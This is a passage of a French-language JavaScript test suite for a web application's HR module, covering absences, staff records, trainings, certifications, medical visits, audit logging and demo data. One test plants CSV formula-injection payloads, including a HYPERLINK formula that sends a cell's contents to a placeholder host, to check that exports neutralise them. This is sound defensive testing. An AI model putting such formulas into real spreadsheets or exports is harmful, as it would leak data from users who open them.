    const a = await admin.ok('POST', '/api/rh/absences', { personnelId: autre.id, typeCode: 'conges', dateDebut: dans(320), dateFin: dans(321), statut: 'validee' });
    assert.equal((await rhSansValider.ok('PUT', `/api/rh/absences/${a.id}`, { commentaire: 'Précision' })).statut, 'validee', 'un commentaire ne remet pas la validation en cause');
    const avant = evenements.length;
    const nChefAvant = notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre)).length;
    const m = await rhSansValider.ok('PUT', `/api/rh/absences/${a.id}`, { dateFin: dans(330) });
    assert.equal(m.statut, 'demandee');
    assert.equal(m.valideurUserId, null);
    assert.equal(m.dateValidation, null);
    assert.ok(evenements.slice(avant).some((e) => e.evt === 'rh:absenceDemandee' && e.d.absence.id === a.id));
    assert.equal(notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre)).length, nChefAvant + 1, 'le N+1 est prévenu');
    assert.ok(srv.db.list('audit', (x) => x.entite === 'absences' && x.entiteId === a.id && x.action === 'statut').length >= 1, 'changement de statut tracé');
    assert.equal((await chef.ok('POST', `/api/rh/absences/${a.id}/valider`, {})).statut, 'validee');
    // Par un valideur RH : l'absence reste validée, la validation est renouvelée à son nom
    const v = await rh.ok('PUT', `/api/rh/absences/${a.id}`, { dateFin: dans(331) });
    assert.equal(v.statut, 'validee');
    assert.equal(v.valideurUserId, rhUser.id);
    assert.equal(v.peutValider, true);
    assert.equal((await rhSansValider.ok('GET', '/api/rh/absences/' + a.id)).peutValider, false, 'indicateur pour l\'interface');
  });

  test('personnel : sa propre fiche, le lien à son compte et le N+1 relèvent d\'un autre gestionnaire', async () => {
    const { c: rh, user: rhUser } = await compte('rhlien', 'Gestionnaire RH', [maint.id], { nom: 'Lien', prenom: 'Léa' });
    const { c: autreRh } = await compte('rhautre', 'Gestionnaire RH', [maint.id]);
    assert.equal((await rh.post('/api/rh/personnel', { nom: 'Lien', secteurId: maint.id, userId: rhUser.id })).status, 403, 'pas de fiche liée à son propre compte');
    const p = await personne({ userId: rhUser.id, secteurId: maint.id });
    assert.equal((await rh.put('/api/rh/personnel/' + p.id, { fonction: 'Directrice' })).status, 403, 'sa propre fiche');
    assert.equal((await rh.put('/api/rh/personnel/' + p.id, { userId: null })).status, 403, 'ni déliée');
    assert.equal((await autreRh.ok('PUT', '/api/rh/personnel/' + p.id, { fonction: 'Gestionnaire RH' })).fonction, 'Gestionnaire RH', 'un autre gestionnaire peut');
    const q = await personne({ nom: 'Équipe', prenom: 'Quentin', secteurId: maint.id });
    assert.equal((await rh.put('/api/rh/personnel/' + q.id, { managerUserId: rhUser.id })).status, 403, 'pas de désignation de soi-même comme N+1');
    assert.equal((await rh.post('/api/rh/personnel', { nom: 'Nouveau', secteurId: maint.id, managerUserId: rhUser.id })).status, 403);
    assert.equal(srv.db.get('personnel', q.id).managerUserId, null);
    assert.equal((await admin.ok('PUT', '/api/rh/personnel/' + q.id, { managerUserId: rhUser.id })).managerUserId, rhUser.id, 'l\'administrateur désigne le N+1');
    assert.ok(srv.db.list('audit', (x) => x.entite === 'personnel' && x.entiteId === q.id && /responsable \(N\+1\)/.test(JSON.stringify(x))).length >= 1, 'changement de N+1 tracé');
    assert.equal((await rh.ok('PUT', '/api/rh/personnel/' + q.id, { fonction: 'Technicien' })).fonction, 'Technicien', 'N+1 déjà en place : les autres champs restent modifiables');
    const { user: tiers } = await compte('tierslien', 'Technicien', [maint.id]);
    await admin.ok('PUT', '/api/rh/personnel/' + q.id, { userId: tiers.id });
    assert.ok(srv.db.list('audit', (x) => x.entite === 'personnel' && x.entiteId === q.id && /compte lié/.test(JSON.stringify(x))).length >= 1, 'changement de compte lié tracé');
  });

  test('formations : une formation réalisée est figée (dates, habilitation visée, participants) ; réalisation refusée hors écriture', async () => {
    const a = await personne({ nom: 'Figée', prenom: 'Anne', secteurId: maint.id });
    const b = await personne({ nom: 'Figée', prenom: 'Bob', secteurId: maint.id });
    const f = await admin.ok('POST', '/api/rh/formations', { intitule: 'SST initial', dateDebut: dans(-3), statut: 'realisee', habilitationTypeCode: 'sst', personnelIds: [a.id] });
    assert.equal((await admin.put('/api/rh/formations/' + f.id, { dateDebut: dans(200), dateFin: dans(201) })).status, 400, 'dates figées');
    assert.equal((await admin.put('/api/rh/formations/' + f.id, { habilitationTypeCode: 'atex' })).status, 400, 'habilitation visée figée');
    assert.equal((await admin.put('/api/rh/formations/' + f.id, { personnelIds: [a.id, b.id] })).status, 400, 'participants figés');
    const maj = await admin.ok('PUT', '/api/rh/formations/' + f.id, { lieu: 'Salle B', cout: 600, description: 'Programme détaillé' });
    assert.equal(maj.statut, 'realisee');
    assert.equal(maj.lieu, 'Salle B');
    assert.equal(maj.habilitationTypeCode, 'sst');
    // Participants d'un site en lecture seule : aucune habilitation n'y est écrite
    const p1 = await personne({ nom: 'Feu', prenom: 'Paul', secteurId: prod.id });
    const p2 = await personne({ nom: 'Feu', prenom: 'Pia', secteurId: prod2.id });
    const inter = await admin.ok('POST', '/api/rh/formations', { intitule: 'Permis feu', dateDebut: dans(-2), habilitationTypeCode: 'permis_feu', personnelIds: [p1.id, p2.id], secteurId: prod.id });
    const { c: rhLect } = await compte('rhlectfor', 'Gestionnaire RH', [prod.id], { siteAcces: [{ siteId: site2.id, mode: 'lecture' }] });
    const refus = await rhLect.post(`/api/rh/formations/${inter.id}/realiser`, {});
    assert.equal(refus.status, 403);
    assert.match(refus.body.erreur, /Pia Feu/);
    assert.equal(srv.db.get('formations', inter.id).statut, 'planifiee');
    assert.equal(srv.db.count('habilitations', (h) => h.personnelId === p2.id), 0);
    const ok = await rhLect.ok('POST', `/api/rh/formations/${inter.id}/realiser`, { presents: [p1.id] });
    assert.deepEqual(ok.habilitationsGenerees.map((g) => g.personnelId), [p1.id]);
    const sansHab = await admin.ok('POST', '/api/rh/formations', { intitule: 'Sensibilisation', dateDebut: dans(-1), personnelIds: [p1.id, p2.id], secteurId: prod.id });
    assert.equal((await rhLect.ok('POST', `/api/rh/formations/${sansHab.id}/realiser`, {})).statut, 'realisee', 'sans habilitation visée : rien n\'est écrit sur l\'autre site');
  });

  test('habilitations : renouvellement par formation — les pièces de la période précédente sont archivées avec elle', async () => {
    const p = await personne({ nom: 'Archive', prenom: 'Alice', secteurId: maint.id });
    const h = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(10), -24), numero: 'SST-2024-117', documents: [{ nom: 'attestation-2024.pdf', type: 'application/pdf', contenu: 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 ancienne').toString('base64') }] });
    const f = await admin.ok('POST', '/api/rh/formations', { intitule: 'MAC SST', dateDebut: dans(-1), statut: 'realisee', habilitationTypeCode: 'sst', personnelIds: [p.id] });
    assert.equal(f.habilitationsGenerees[0].action, 'renouvelee');
    const r = await admin.ok('GET', '/api/rh/habilitations/' + h.id);
    assert.equal(r.nbDocuments, 0, 'la nouvelle période repart sans pièce');
    assert.equal(r.numero, '');
    assert.equal(r.historique.length, 1);
    assert.equal(r.historique[0].numero, 'SST-2024-117');
    assert.deepEqual(r.historique[0].documents.map((d) => d.nom), ['attestation-2024.pdf']);
    assert.equal(r.historique[0].documents[0].contenu, undefined, 'contenu non renvoyé dans la fiche');
    const dl = await admin.get(`/api/rh/habilitations/${h.id}/historique/${r.historique[0].rang}/documents/0`);
    assert.equal(dl.status, 200);
    assert.match(String(dl.body), /ancienne/);
    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/historique/3/documents/0`)).status, 404);
    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/documents/0`)).status, 404);
  });

  test('exports CSV : les cellules commençant par un caractère de formule sont neutralisées', async () => {
    await personne({ nom: '=HYPERLINK("http://exemple.invalid/?x="&A1;"Cliquer")', prenom: '+SUM(1;2)', fonction: '@cmd', secteurId: maint.id, coutHoraire: 40.5 });
    const csv = String((await admin.get('/api/rh/export/personnel')).body);
    const ligne = csv.split('\r\n').find((l) => l.includes('HYPERLINK'));
    assert.ok(ligne, 'ligne exportée');
    assert.ok(ligne.includes(';"\'=HYPERLINK('), 'apostrophe devant =');
    assert.ok(ligne.includes(';"\'+SUM(1;2)";\'@cmd;'), 'apostrophe devant + et @');
    assert.ok(ligne.includes(';40,5;'), 'les nombres restent des nombres');
  });

  test('vérification des échéances : le déclenchement manuel reste dans la portée de l\'utilisateur', async () => {
    const pv = await personne({ nom: 'Échéance', prenom: 'Valréas', secteurId: prod2.id });
    const hv = await admin.ok('POST', '/api/rh/habilitations', { personnelId: pv.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(-10), -24) });
    assert.equal(hv.etat, 'expiree');
    const { c: rh1 } = await compte('rhcarp', 'Gestionnaire RH', [prod.id]);
    const { c: rhL } = await compte('rhlectech', 'Gestionnaire RH', [prod.id], { siteAcces: [{ siteId: site2.id, mode: 'lecture' }] });
    await rh1.ok('POST', '/api/rh/verifier-echeances', {});
    assert.deepEqual(srv.db.get('habilitations', hv.id).alertes, {}, 'site 2 hors portée : non traité');
    await rhL.ok('POST', '/api/rh/verifier-echeances', {});
    assert.deepEqual(srv.db.get('habilitations', hv.id).alertes, {}, 'site 2 en lecture seule : non traité');
    const r = await admin.ok('POST', '/api/rh/verifier-echeances', {});
    assert.ok(r.expirees >= 1);
    assert.equal(srv.db.get('habilitations', hv.id).alertes.expiree, hv.dateExpiration);
  });

  test('personnel : la prochaine visite médicale programmée est exposée dans le résumé', async () => {
    const p = await personne({ nom: 'Programmée', prenom: 'Émilie', secteurId: log.id });
    await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'periodique', date: dans(-500), aptitude: 'apte', prochaineVisite: dans(960) });
    const reprise = await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'reprise', date: dans(3), aptitude: 'en_attente' });
    const dv = (await admin.ok('GET', '/api/rh/personnel/' + p.id)).derniereVisite;
    assert.equal(dv.etat, 'programmee');
    assert.deepEqual(dv.programmee, { id: reprise.id, date: dans(3), type: 'reprise' });
    const q = await personne({ nom: 'Embauche', prenom: 'Lucas', secteurId: log.id });
    await admin.ok('POST', '/api/rh/visites', { personnelId: q.id, type: 'embauche', date: dans(-45), aptitude: 'apte' });
    const dq = (await admin.ok('GET', '/api/rh/personnel?recherche=Embauche')).find((x) => x.id === q.id).derniereVisite;
    assert.equal(dq.prochaineVisite, null);
    assert.equal(dq.programmee, null);
  });

  test('audit et références des formulaires', async () => {
    const actions = new Set(srv.db.list('audit', (a) => ['personnel', 'habilitations', 'formations', 'visitesMedicales', 'absences'].includes(a.entite)).map((a) => `${a.entite}:${a.action}`));
    for (const attendu of ['personnel:creation', 'personnel:modification', 'personnel:desactivation', 'personnel:suppression', 'habilitations:creation', 'habilitations:renouvellement', 'habilitations:document', 'formations:creation', 'formations:statut', 'visitesMedicales:creation', 'absences:creation', 'absences:validation', 'absences:refus', 'absences:statut']) {
      assert.ok(actions.has(attendu), `audit ${attendu}`);
    }
    srv.db.insert('fournisseurs', { nom: 'APAVE Sud Europe', typeCode: 'prestataire', actif: true });
    const refs = await admin.ok('GET', '/api/rh/references');
    assert.ok(refs.fournisseurs.some((f) => f.nom === 'APAVE Sud Europe'));
    assert.ok(Array.isArray(refs.factures), 'factures proposées avec le droit achats › voir');
    const { c: rh } = await compte('rhrefs', 'Gestionnaire RH', [maint.id]);
    const refsRh = await rh.ok('GET', '/api/rh/references');
    assert.equal(refsRh.factures, null, 'pas de factures sans achats › voir');
    assert.ok(refsRh.fournisseurs.length >= 1, 'prestataires accessibles sans le droit fournisseurs');
  });
});

describe('Ressources humaines : données de démonstration', () => {
  let srv;
  before(async () => { srv = await demarrer(); });
  after(async () => { await srv.stop(); });

  test('seedDemo : fiches liées aux comptes, échéances réalistes, idempotent, site de Valréas', async () => {
    const admin = srv.client();
    await admin.login('admin', 'admin');
    const val = await admin.ok('POST', '/api/secteurs', { nom: 'Usine de Valréas', code: 'VAL', type: 'site' });
    await admin.ok('POST', '/api/secteurs', { nom: 'Maintenance Valréas', code: 'VAL-MAINT', type: 'service', parentId: val.id });
    const mod = srv.ctx.modules.find((m) => m.fichier === 'rh.js');
    const r = mod.seedDemo(srv.ctx);
    assert.match(r, /9 fiches/);
    assert.match(r, /Valréas : 3 fiches/);
    const n = srv.db.count('personnel');
    assert.equal(n, 12);
    assert.match(mod.seedDemo(srv.ctx), /déjà présent/);
    assert.equal(srv.db.count('personnel'), n, 'idempotent');
    for (const login of ['mdupont', 'pmartin', 'jbernard', 'kleroy', 'spetit']) {
      const u = srv.db.findOne('users', (x) => x.login === login);
      assert.ok(u, `compte ${login}`);
      assert.ok(srv.db.findOne('personnel', (p) => p.userId === u.id), `fiche liée à ${login}`);
    }
    assert.equal(srv.db.count('personnel', (p) => p.userId == null && p.secteurId !== null && srv.ctx.siteDuSecteur(p.secteurId) !== val.id), 4, '4 personnes sans compte');
    assert.equal(srv.db.count('personnel', (p) => p.typeContratCode === 'interim'), 1);
    const al = await admin.ok('GET', '/api/rh/alertes');
    const princ = al.habilitations.filter((x) => x.siteId !== val.id);
    assert.equal(princ.filter((x) => x.etat === 'bientot').length, 2, '2 habilitations bientôt expirées');
    assert.equal(princ.filter((x) => x.etat === 'expiree').length, 1, '1 habilitation expirée');
    const types = new Set(srv.db.list('habilitations').map((h) => h.typeCode));
    for (const t of ['elec_b1v', 'elec_b2v', 'caces_r489', 'sst', 'travail_hauteur']) assert.ok(types.has(t), t);
    const formations = await admin.ok('GET', '/api/rh/formations');
    assert.equal(formations.length, 3);
    assert.equal(formations.filter((f) => f.statut === 'realisee').length, 1);
    assert.equal((await admin.ok('GET', '/api/rh/absences?statut=demandee')).length, 1, '1 demande en attente');
    assert.ok((await admin.ok('GET', '/api/rh/absences?statut=validee')).length >= 5);
    assert.ok(srv.db.count('visitesMedicales') >= 10);
    assert.ok(srv.db.count('personnel', (p) => srv.ctx.siteDuSecteur(p.secteurId) === val.id) === 3, 'personnel de Valréas');
    const md = srv.client();
    await md.login('mdupont', 'demo');
    const moi = await md.ok('GET', '/api/rh/moi');
    assert.equal(moi.personnel.nomComplet, 'Marie Dupont');
    assert.equal(moi.aValider.length, 1, 'demande de Karim Leroy à valider par son N+1');
  });

  test('seedDemo : un compte déjà lié à une fiche n\'est pas lié une seconde fois', async () => {
    const s2 = await demarrer();
    try {
      s2.ctx.modules.find((m) => m.fichier === 'utilisateurs.js').seedDemo(s2.ctx);
      const admin = s2.client();
      await admin.login('admin', 'admin');
      const u = s2.db.findOne('users', (x) => x.login === 'mdupont');
      const maint = s2.db.findOne('secteurs', (x) => x.code === 'MAINT');
      const existante = await admin.ok('POST', '/api/rh/personnel', { userId: u.id, secteurId: maint.id, typeContratCode: 'cdi', fonction: 'Fiche saisie avant la démonstration' });
      s2.ctx.modules.find((m) => m.fichier === 'rh.js').seedDemo(s2.ctx);
      assert.equal(s2.db.count('personnel', (p) => Number(p.userId) === u.id), 1, 'une seule fiche liée au compte');
      assert.ok(s2.db.count('habilitations', (h) => h.personnelId === existante.id) >= 1, 'la fiche existante est réutilisée par la démonstration');
    } finally { await s2.stop(); }
  });
});
